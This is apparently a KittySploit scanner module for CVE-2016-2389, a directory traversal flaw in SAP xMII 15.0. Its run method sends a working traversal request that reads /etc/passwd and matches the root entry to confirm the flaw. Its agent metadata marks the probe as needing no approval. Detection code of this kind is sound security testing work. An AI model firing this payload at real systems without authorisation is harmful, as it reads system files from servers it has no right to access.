#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SAP xMII 15."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SAP xMII 15.0 for SAP NetWeaver 7.4 - Local File Inclusion Detection',
        'description': 'SAP xMII 15.0 for SAP NetWeaver 7.4 is susceptible to a local file inclusion vulnerability in the GetFileList function. This can allow remote attackers to read arbitrary files via a .. (dot dot) in the path parameter to /Catalog, aka SAP Security Note 2230978.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'packetstorm', 'seclists', 'lfi', 'sap', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://web.archive.org/web/20211209003818/https://erpscan.io/advisories/erpscan-16-009-sap-xmii-directory-traversal-vulnerability/',
            'http://packetstormsecurity.com/files/137046/SAP-MII-15.0-Directory-Traversal.html',
            'https://www.exploit-db.com/exploits/39837/',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-2389',
            'http://seclists.org/fulldisclosure/2016/May/40',
        ],
        'cve': 'CVE-2016-2389',
    }

    def run(self):
        r = self.http_request(method="GET", path='/XMII/Catalog?Mode=GetFileList&Path=Classes/../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="SAP xMII 15.0 for SAP NetWeaver 7.4 - Local File Inclusion detected",
                path='/XMII/Catalog?Mode=GetFileList&Path=Classes/../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

